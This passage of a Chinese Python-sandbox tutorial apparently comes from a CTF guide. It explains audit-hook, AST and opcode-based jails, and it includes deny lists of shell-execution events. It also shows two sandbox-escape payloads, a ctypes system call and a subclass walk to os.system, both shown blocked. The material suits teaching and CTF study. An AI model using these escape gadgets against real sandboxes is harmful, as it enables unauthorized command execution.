<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_hook</span>(<span class="params">event, args</span>):</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Opening file: <span class="subst">&#123;args&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys.addaudithook(audit_hook)</span><br></pre></td></tr></table></figure></div>

<p>然后，如果运行 <code>open(&#39;myfile.txt&#39;)</code>，就会得到 <code>Opening file: (&#39;myfile.txt&#39;,)</code> 这样的输出。</p>
<h3 id="sys-addaudithook-构建沙箱"><a href="#sys-addaudithook-构建沙箱" class="headerlink" title="sys.addaudithook 构建沙箱"></a>sys.addaudithook 构建沙箱</h3><p>在一些沙箱的题目中也会使用这种方式，例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    ...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">sys.addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p>这个沙箱对<code>&#39;pty.spawn&#39;, &#39;os.system&#39;, &#39;os.exec&#39;, &#39;os.posix_spawn&#39;,&#39;os.spawn&#39;,&#39;subprocess.Popen&#39;</code> 这些函数进行了限制，一旦调用则抛出异常.</p>
<p>白名单比黑名单的限制更大,下面的沙箱只允许 input exec compile 等函数的调用。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">my_event, _</span>):</span><br><span class="line">    WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> my_event <span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation not permitted: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_event))</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p>一般的 payload 无法使用：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line">Operation <span class="keyword">not</span> permitted: <span class="keyword">import</span></span><br><span class="line">&gt; [ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">Operation <span class="keyword">not</span> permitted: os.system</span><br></pre></td></tr></table></figure></div>

<h3 id="PySys-AddAuditHook-构建沙箱"><a href="#PySys-AddAuditHook-构建沙箱" class="headerlink" title="PySys_AddAuditHook 构建沙箱"></a>PySys_AddAuditHook 构建沙箱</h3><p><strong><code>PySys_AddAuditHook</code> 是 CPython 提供的 C 级审计钩子注册接口（见 PEP 578）</strong>。你在 C 里实现一个回调：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*Py_AuditHookFunction)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *event, PyObject *args, <span class="type">void</span> *userData)</span>;</span><br></pre></td></tr></table></figure></div>

<p>然后在 <strong>初始化 Python 解释器之前</strong> 调用 <code>PySys_AddAuditHook</code> 把这个回调注册进去。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">PySys_AddAuditHook</span><span class="params">(Py_AuditHookFunction hook, <span class="type">void</span> *userData)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>PySys_AddAuditHook</code> 是 <strong>CPython 提供的一个 C API</strong>（PEP 578 定义的），它不是一个 Python 脚本、也不是第三方插件，而是<strong>嵌入到 CPython 解释器里的 C 函数</strong>。</p>
<blockquote>
<p>Python 解释器的核心逻辑（编译、执行、内存管理、导入模块等）其实是一个 <strong>C 语言写的库</strong>，一般叫做：</p>
<ul>
<li>Linux&#x2F;macOS 上：<code>libpython3.x.so</code>（动态链接库）</li>
<li>Windows 上：<code>python3x.dll</code>（DLL 动态库）</li>
</ul>
<p>平时你在终端敲的 <code>python3</code> 这个可执行文件，其实只是一个<strong>很薄的外壳</strong>，它在 <code>main()</code> 函数里调用这个库里的 API，比如：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    Py_Initialize();   <span class="comment">// 初始化解释器</span></span><br><span class="line">    PyRun_AnyFile(...); <span class="comment">// 运行交互模式或脚本</span></span><br><span class="line">    Py_Finalize();     <span class="comment">// 收尾</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以你完全可以用 C 代码自己写一个“自己的解释器入口”。这样你就能在 <code>Py_Initialize()</code> 之前插钩子（<code>PySys_AddAuditHook</code>）。编译出来的可执行文件就能跑 Python 代码，但带着你自己加的安全策略，Python 脚本里删不掉它。</p>
</blockquote>
<p>之所以要在 <code>Py_Initialize()</code> <strong>之前</strong>安装，是为了<strong>捕获并控制解释器启动早期</strong>的所有审计事件（例如早期导入、初始化步骤等）；如果等初始化后才装，启动阶段已经发生的那些事件你就看不到了。</p>
<p>这个钩子是<strong>进程级别</strong>的：安装后对当前进程里的所有子解释器都生效；同时它<strong>不可移除</strong>，这能防止运行期的恶意代码把审计卸掉。当某个事件触发你的回调时，<strong>如果你想阻断该操作</strong>，就先用诸如 <code>PyErr_SetString(PyExc_RuntimeError, &quot;blocked&quot;)</code> 之类的 API <strong>设置一个 Python 异常</strong>，再让回调<strong>返回非 0（通常返回 -1）</strong>，解释器就会以这个异常拒绝继续执行该事件。</p>
<p>与之对比，<code>sys.addaudithook</code> 是<strong>Python 层</strong>在运行时注册的钩子，安装时机通常更晚、可见性更高，适合应用内的审计或记录；而<strong>如果你的目标是在“一切发生之前”就拦住敏感点（包括启动与早期导入）</strong>，或希望钩子对 Python 代码不可见、不可卸，**优先选择 C 级的 <code>PySys_AddAuditHook</code>**。</p>
<p>例如下面这段示例代码可以阻断 <code>import</code>、<code>os.system</code>、<code>subprocess.Popen</code> 等事件：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// audit_hook.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PY_SSIZE_T_CLEAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_audit_hook</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *event, PyObject *args, <span class="type">void</span> *ud)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(event, <span class="string">&quot;os.system&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;subprocess.Popen&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;os.exec&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;os.posix_spawn&quot;</span>) == <span class="number">0</span></span><br><span class="line">     || <span class="built_in">strcmp</span>(event, <span class="string">&quot;os.spawn&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        PyErr_SetString(PyExc_RuntimeError, <span class="string">&quot;blocked by C audit hook&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 阻断危险操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;       <span class="comment">// 其他操作放行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 在初始化之前装钩子</span></span><br><span class="line">    PySys_AddAuditHook(my_audit_hook, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 告诉解释器进入交互模式</span></span><br><span class="line">    <span class="comment">//   （在 TTY 下其实不设也会进入；设上更保险）</span></span><br><span class="line">    Py_InteractiveFlag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 初始化解释器</span></span><br><span class="line">    Py_Initialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 打个提示</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,</span><br><span class="line">        <span class="string">&quot;== C-audited Python REPL ==\n&quot;</span></span><br><span class="line">        <span class="string">&quot;试着执行: import os; os.system(&#x27;id&#x27;)，会被拦截。\n&quot;</span></span><br><span class="line">        <span class="string">&quot;Ctrl-D 退出。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 进入交互 REPL（从 stdin 读并执行）</span></span><br><span class="line">    <span class="comment">//    如果你的 Python 版本不支持这个函数，可用 PyRun_InteractiveLoop 替代</span></span><br><span class="line">    PyRun_AnyFile(<span class="built_in">stdin</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 收尾</span></span><br><span class="line">    <span class="keyword">if</span> (Py_FinalizeEx() &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">120</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编译命令：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install python3.10-dev  <span class="comment"># 版本号按你系统的 Python 版本改</span></span><br><span class="line">cc audit_hook.c -o audit_hook $(python3-config --embed --cflags --ldflags)</span><br><span class="line">./audit_hook</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">== C-audited Python REPL ==</span><br><span class="line">试着执行: <span class="keyword">import</span> os; os.system(<span class="string">&#x27;id&#x27;</span>)，会被拦截。</span><br><span class="line">Ctrl-D 退出。</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">RuntimeError: blocked by C audit hook</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="基于-AST-的沙箱"><a href="#基于-AST-的沙箱" class="headerlink" title="基于 AST 的沙箱"></a>基于 AST 的沙箱</h2><p>Python 的抽象语法树（AST，Abstract Syntax Tree）是一种用来表示 Python 源代码的树状结构。在这个树状结构中，每个节点都代表源代码中的一种结构，如一个函数调用、一个操作符、一个变量等。Python 的 ast 模块提供了一种机制来解析 Python 源代码并生成这样的抽象语法树。 下面是Python <code>ast</code>模块的一些常见节点类型：</p>
<ul>
<li><code>ast.Module</code>: 表示一个整个的模块或者脚本。</li>
<li><code>ast.FunctionDef</code>: 表示一个函数定义。</li>
<li><code>ast.AsyncFunctionDef</code>: 表示一个异步函数定义。</li>
<li><code>ast.ClassDef</code>: 表示一个类定义。</li>
<li><code>ast.Return</code>: 表示一个return语句。</li>
<li><code>ast.Delete</code>: 表示一个del语句。</li>
<li><code>ast.Assign</code>: 表示一个赋值语句。</li>
<li><code>ast.AugAssign</code>: 表示一个增量赋值语句，如<code>x += 1</code>。</li>
<li><code>ast.For</code>: 表示一个for循环。</li>
<li><code>ast.While</code>: 表示一个while循环。</li>
<li><code>ast.If</code>: 表示一个if语句。</li>
<li><code>ast.With</code>: 表示一个with语句。</li>
<li><code>ast.Raise</code>: 表示一个raise语句。</li>
<li><code>ast.Try</code>: 表示一个try&#x2F;except语句。</li>
<li><code>ast.Import</code>: 表示一个import语句。</li>
<li><code>ast.ImportFrom</code>: 表示一个from…import…语句。</li>
<li><code>ast.Expr</code>: 表示一个表达式。</li>
<li><code>ast.Call</code>: 表示一个函数调用。</li>
<li><code>ast.Name</code>: 表示一个变量名。</li>
<li><code>ast.Attribute</code>: 表示一个属性引用，如<code>x.y</code>。</li>
</ul>
<p>以上列举的只是<code>ast</code>模块中一部分的节点类型，还有很多其他类型的节点。更详细的列表可以在Python官方文档的<code>ast</code>模块部分找到。</p>
<p>一些 CTF 题目就采用了检查 AST 节点构建沙箱, 下面是一个示例. 在这个示例中, verify_secure 函数对 compile 之后的代码进行校验, 禁止 ast.Import</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure></div>

<h2 id="基于-opcode-的沙箱"><a href="#基于-opcode-的沙箱" class="headerlink" title="基于 opcode 的沙箱"></a>基于 opcode 的沙箱</h2><h3 id="字节码概念"><a href="#字节码概念" class="headerlink" title="字节码概念"></a>字节码概念</h3><p>Python 源代码会先被编译成一种中间表示形式——<strong>字节码（Bytecode）</strong>，它是 Python 虚拟机（PVM）可直接执行的指令集。字节码由一系列 <strong>操作码（opcode）</strong> 组成，与平台无关，只要有相应版本的 Python 解释器都能执行。</p>
<p>操作码（Opcode）是字节码中的一条指令，用于告诉虚拟机要执行的操作。操作码由 1 字节的整数值（0-255 之间）表示，一个字节表示一个 opcode，对应的助记符（如 <code>LOAD_CONST</code>、<code>BINARY_OP</code>）。</p>
<p>编译阶段 Python 将 <code>.py</code> 源文件编译成字节码（可缓存到 <code>.pyc</code> 文件中）；执行阶段PVM 逐条读取并执行字节码指令。</p>
<p>Python 提供了 <code>dis</code> 模块用来查看指定函数字节码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">dis.dis(add)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  2           0 LOAD_FAST                0 (a)</span></span><br><span class="line"><span class="string">              2 LOAD_FAST                1 (b)</span></span><br><span class="line"><span class="string">              4 BINARY_ADD</span></span><br><span class="line"><span class="string">              6 RETURN_VALUE</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>或者使用 <code>dis.opmap</code> 和 <code>dis.opname</code> 查看具体某个字节码的助记符。Python 一般最多有 256 种操作码（0-255），部分保留或未定义。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="built_in">print</span>(dis.opmap[<span class="string">&#x27;LOAD_CONST&#x27;</span>])  <span class="comment"># -&gt; 100</span></span><br><span class="line"><span class="built_in">print</span>(dis.opname[<span class="number">100</span>])          <span class="comment"># -&gt; &#x27;LOAD_CONST&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="沙箱示例"><a href="#沙箱示例" class="headerlink" title="沙箱示例"></a>沙箱示例</h3><p>以 <strong>LACTF 2023 Pycjail</strong> 为例：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始的禁止指令列表（按名称）</span></span><br><span class="line"><span class="comment"># IMPORT_NAME     → 用于 import 语句导入模块</span></span><br><span class="line"><span class="comment"># MAKE_FUNCTION   → 用于定义函数（def / lambda）</span></span><br><span class="line">banned = [<span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;MAKE_FUNCTION&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有 Python opcode 的名字（opcode.opmap 是 &#123;指令名: opcode数值&#125; 的映射）</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> opcode.opmap:</span><br><span class="line">    <span class="comment"># 如果指令名中包含 &quot;LOAD&quot; 且不是 &quot;LOAD_CONST&quot;</span></span><br><span class="line">    <span class="comment">#   LOAD_* 指令会从变量、属性、全局等位置取值</span></span><br><span class="line">    <span class="comment">#   LOAD_CONST 例外，因为它只从常量池取值，不会访问外部环境</span></span><br><span class="line">    <span class="comment"># 或者指令名中包含 &quot;STORE&quot;</span></span><br><span class="line">    <span class="comment">#   STORE_* 指令会把值存到变量、属性等地方</span></span><br><span class="line">    <span class="comment"># 或者指令名中包含 &quot;DELETE&quot;</span></span><br><span class="line">    <span class="comment">#   DELETE_* 指令会删除变量、属性等</span></span><br><span class="line">    <span class="comment"># 或者指令名中包含 &quot;JUMP&quot;</span></span><br><span class="line">    <span class="comment">#   JUMP_* 指令会进行跳转（影响控制流）</span></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        (<span class="string">&quot;LOAD&quot;</span> <span class="keyword">in</span> k <span class="keyword">and</span> k != <span class="string">&quot;LOAD_CONST&quot;</span>)</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;STORE&quot;</span> <span class="keyword">in</span> k</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;DELETE&quot;</span> <span class="keyword">in</span> k</span><br><span class="line">        <span class="keyword">or</span> <span class="string">&quot;JUMP&quot;</span> <span class="keyword">in</span> k</span><br><span class="line">    ):</span><br><span class="line">        <span class="comment"># 把该指令名加入禁止列表</span></span><br><span class="line">        banned.append(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指令名转换成 opcode 数值集合（便于直接和字节码的 opcode 对比）</span></span><br><span class="line">banned = &#123;opcode.opmap[x] <span class="keyword">for</span> x <span class="keyword">in</span> banned&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># （后续代码片段，假设 code 是用户输入编译后的字节码序列）</span></span><br><span class="line"><span class="comment"># 从 0 开始，每隔 2 字节取一个值（每个指令1字节opcode + 1字节参数）</span></span><br><span class="line"><span class="comment"># 检查这些 opcode 是否在禁止集合中</span></span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">any</span>(code[i] <span class="keyword">in</span> banned <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">2</span>)):</span><br><span class="line">    <span class="comment"># 一旦发现存在被禁的 opcode，就拒绝执行</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;banned opcode &gt;:(&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>过滤规则：</p>
<ul>
<li><strong>显式禁止</strong>：<ul>
<li><code>IMPORT_NAME</code>（导入模块）</li>
<li><code>MAKE_FUNCTION</code>（定义新函数）</li>
</ul>
</li>
<li><strong>模式禁止</strong>：<ul>
<li>所有 <code>LOAD_*</code>（除了 <code>LOAD_CONST</code>）</li>
<li>所有 <code>STORE_*</code>（变量赋值）</li>
<li>所有 <code>DELETE_*</code>（删除变量&#x2F;属性）</li>
<li>所有 <code>JUMP_*</code>（跳转指令）</li>
</ul>
</li>
</ul>
<p>过滤效果：</p>
<ul>
<li>被禁能力：<ul>
<li>读取任何变量、全局名、属性（<code>LOAD_NAME</code>、<code>LOAD_GLOBAL</code>…）。</li>
<li>赋值、删除变量。</li>
<li>跳转、循环、条件控制。</li>
<li>导入模块、定义函数。</li>
</ul>
</li>
<li>允许能力：<ul>
<li><code>LOAD_CONST</code>（加载常量）</li>
<li>算术运算（<code>BINARY_OP</code>）</li>
<li>构造常量结构（<code>BUILD_LIST</code>、<code>BUILD_TUPLE</code>…）</li>
<li><code>RETURN_VALUE</code></li>
</ul>
</li>
</ul>
<h1 id="绕过删除模块或方法"><a href="#绕过删除模块或方法" class="headerlink" title="绕过删除模块或方法"></a>绕过删除模块或方法</h1><p>在一些沙箱中，可能会对某些模块或者模块的某些方法使用 <code>del</code> 关键字进行删除。 例如删除 builtins 模块的 eval 方法。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure></div>

